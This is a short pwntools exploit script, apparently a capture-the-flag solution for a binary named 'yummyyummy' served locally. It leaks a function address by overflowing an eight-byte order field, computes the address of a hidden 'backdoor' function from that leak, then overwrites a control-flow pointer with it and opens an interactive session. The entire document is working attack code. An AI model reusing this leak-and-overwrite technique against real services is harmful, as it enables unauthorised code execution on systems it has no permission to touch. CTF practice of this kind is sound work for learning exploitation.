from pwn import *


#p = process('./yummyyummy')
p = remote('127.0.0.1',33265)
backdoor = 0x0c30
p.recvuntil(b'< You can order five times >')
p.sendafter('Quantity:',str(0x10))
p.sendlineafter('Order:',b'a' * 8 )
p.recvuntil('a'*8)

bye_func = u64(p.recv(6).ljust(8,b'\0'))
backdoor_addr = bye_func + 0x26
print(hex(bye_func))
print(hex(backdoor_addr))

p.sendafter('Quantity:',str(0x10))
p.sendlineafter('Order:', b'a' * 8 )

p.sendafter('Quantity:',str(0x10))
p.sendlineafter('Order:', b'a' * 8)

p.sendafter('Quantity:',str(0x10))
p.sendlineafter('Order:', b'a' * 8 )

p.sendafter('Quantity:',str(0x10))
p.sendlineafter('Order:', b'a' * 8  + p64(backdoor_addr))
p.interactive()